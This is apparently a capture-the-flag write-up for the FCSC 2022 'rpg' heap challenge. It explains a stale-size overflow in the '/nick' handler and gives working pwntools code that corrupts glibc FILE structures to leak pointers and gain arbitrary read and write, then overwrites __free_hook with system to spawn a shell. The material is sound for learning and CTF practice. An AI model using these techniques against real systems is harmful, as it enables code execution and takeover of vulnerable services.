## FCSC 2022 - pwn - rpg - medium

this challenge has all protections enabled
```
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
```

by reading the main function we can see that the program reads a username and opens  
/dev/urandom, then after that the binary loops forever, reading our messages and echoing back or running commands (/nick, /me, /roll, /quit) it also frees our input in the end (this will be useful later)

```
int main(void)
{
        char *name  = NULL;
        size_t size = 0;

        /* Disable buffering on stdio */
        setbuf(stdin,  NULL);
        setbuf(stdout, NULL);

        /* Ask for a name */
        printf("name> ");
        if(0 > getline(&name, &size, stdin)) {
                perror("getline");
                return EXIT_FAILURE;
        }
        name[strcspn(name, "\n")] = 0; // last characted of name string set to \x00

        /* Open the RNG source */
        FILE *fp = fopen("/dev/urandom", "r");

        if(NULL == fp) {
                perror("fopen");
                return EXIT_FAILURE;
        }

        message("%s logged in", name);

        /* Read messages */
        while(1) {
                char *msg   = NULL;
                size_t size = 0;

                if(0 > getline(&msg, &size, stdin)) {
                        perror("getline");
                        return EXIT_FAILURE;
                }
                msg[strcspn(msg, "\n")] = 0;

                /* Handle commands */
                if('/' == msg[0] && '/' != msg[1]) {
                        const char *cmd = strtok(msg + 1, " ");
                        const char *arg = strtok(NULL, "");

                        if(0 == strcmp(cmd, "quit")) {
                                if(arg)
                                        message("%s quit (%s)", name, arg);
                                else
                                        message("%s quit", name);
                                break;
                        } else if(0 == strcmp(cmd, "me")) {
                                message("*** %s %s ***", name, arg);
                        } else if(0 == strcmp(cmd, "nick")) {
                                message("%s is now known as %s", name, arg);

                                if(strlen(arg) >= size)
                                        name = realloc(name, size + 1);

                                strcpy(name, arg);
                        } else if(0 == strcmp(cmd, "roll")) {
                                /* You can play with *very large* dices */
                                size_t mod = atol(arg);
                                size_t r = 0;

                                if(0 == mod) {
                                        message("Cannot roll 0-faced dices");
                                        continue;
                                }

                                if(sizeof(r) != fread(&r, 1, sizeof(r), fp)) {
                                        perror("fread");
                                        continue;
                                }

                                r %= mod;

                                message("%s rolled 1d%lu: %lu", name, mod, r);
                        } else {
                                message("invalid command: %s", cmd);
                        }
                } else {
                        /* regular message */
                        const char *m = msg;
                        if('/' == m[0])
                                m++;

                        message("%s: %s", name, m);
                }

                free(msg);
        }
}
```

### the vulnerability

name and msg are separate variables, but their length trackers are both called size, declared in different scopes. By the time the /nick handler runs, size no longer holds the length of the namebuffer, it holds the length of whatever the current message was

the /nick handler tries to guard against overflow:
```
if (strlen(arg) >= size)
    name = realloc(name, size + 1);
strcpy(name, arg);
```
but since size is stale, this check almost always evaluates against the wrong number, the reallocnever happens, and strcpy(name, arg) overflows the original name heap chunk with our controlled data of choosen length

the overflow lands on the heap. chunk layout puts the FILE structure for /dev/urandom directly after the name buffer, since its allocated right after fopen() immediately following the initial getline for the name

at the point fopen() returns, all the FILE struct fields are null because glibc doesnt fill the read buffer pointers until the first read, that first read happens on the first /roll call, via fread()

we overflow into the struct before the first /roll, filling exactly up to _flags, with null bytes at the end of our payload, then trigger /roll 1. glibc allocates a read buffer and writes a heap pointer into _IO_read_ptr right next to our un-terminated string, the next time name gets printed, printf prints eveything from our payload and continues until a null byte, but we filled the FILE struct until the _IO_read_ptr with non null bytes, so it prints the heap pointer for it:

```
MARKER = b'B' * 4
PADDING = b'A' * 128
FILE_FLAGS = 0xfbad2488

sendl(b'/nick ' + PADDING + p32(FILE_FLAGS) + MARKER) # prepare FILE struct for the leak
sendl(b'/roll 1') # trigger the leak ( fopen('/dev/urandom') )

before /roll 1: 
_flags: 0x42424242fbad2488
_IO_read_ptr: 0x0000000000000000
_IO_read_end: 0x0000000000000000
_IO_read_base: 0x0000000000000000

after /roll 1 (fread() called on /dev/urandom):
_flags: 0x42424242fbad2488
_IO_read_ptr: 0x0000562c19b91c88 (full heap pointer) no null bytes between payload and _IO_read_ptr pointer -> prints full pointer back to us
```

### arbitrary read

now we can rewrite the same fields to point anywhere and trigger another /roll to read from there
```python
MARKER = b'B' * 4
PADDING = b'A' * 128
FILE_FLAGS = 0xfbad2488

def IO_read(addr):
    payload = flat([
        p32(FILE_FLAGS),
        MARKER,
        p64(addr),           # _IO_read_ptr
        p64(addr + 0x100),   # _IO_read_end (just needs to be > read_ptr)
        p64(addr),           # _IO_read_base
    ])
    rename(PADDING + payload)
    sendl(b"/roll 1000000000000000000")  # modulus bigger than any real value
    recvu(b": ")
    return int(recvl().strip())
```
### leaking libc

/dev/urandom's FILE struct is the fourth file opened by the process (after stdin/stdout/stderr), so its chain field (offset 0x68) points at the previous open file: _IO_2_1_stderr_ which is in libc's bss at a fixed offset from the libc base
```
_IO_2_1_stderr_ = IO_read(file_address + 0x68)
print(f'[LEAK] _IO_2_1_stderr_: {hex(_IO_2_1_stderr_)}')
```

### arbitrary write

setting _fileno to 0 (stdin) makes the libc's buffer refill logic read from our own controlled input instead of /dev/urandom. Setting _IO_buf_base/_IO_buf_end to the target address and length makes that refill land exactly where we want

```
def IO_write(what, where):
    fs = FileStructure()
    fs.flags = FILE_FLAGS
    fs._IO_buf_base = where
    fs._IO_buf_end  = where + len(what)
    fs.chain  = libc.symbols["_IO_2_1_stderr_"]
    fs.fileno = 0

    payload = fs.struntil("fileno")
    rename(PADDING + payload)
    sendl(b"/roll 1")
    send(what)
```

note: /roll reads exactly 8 bytes, if the write payload (what) is exactly 8 bytes, libc's underflow logic ignores the buffer entirely, padding to 9 bytes (p64(libc.symbols["system"]) + b"\x00") fixes this

with __free_hook pointed at system, the program's loop free(msg) call effectively becomes system(msg) on every message sent from now on
```
IO_write(p64(libc.symbols["system"]) + b'\0', libc.symbols["__free_hook"])
sendl(b"//bin/sh")
io.interactive()
```
notice that we write //bin/sh instead of /bin/sh, it is because the first / gets parsed as a command prefix so our /bin/sh will instead become bin/sh
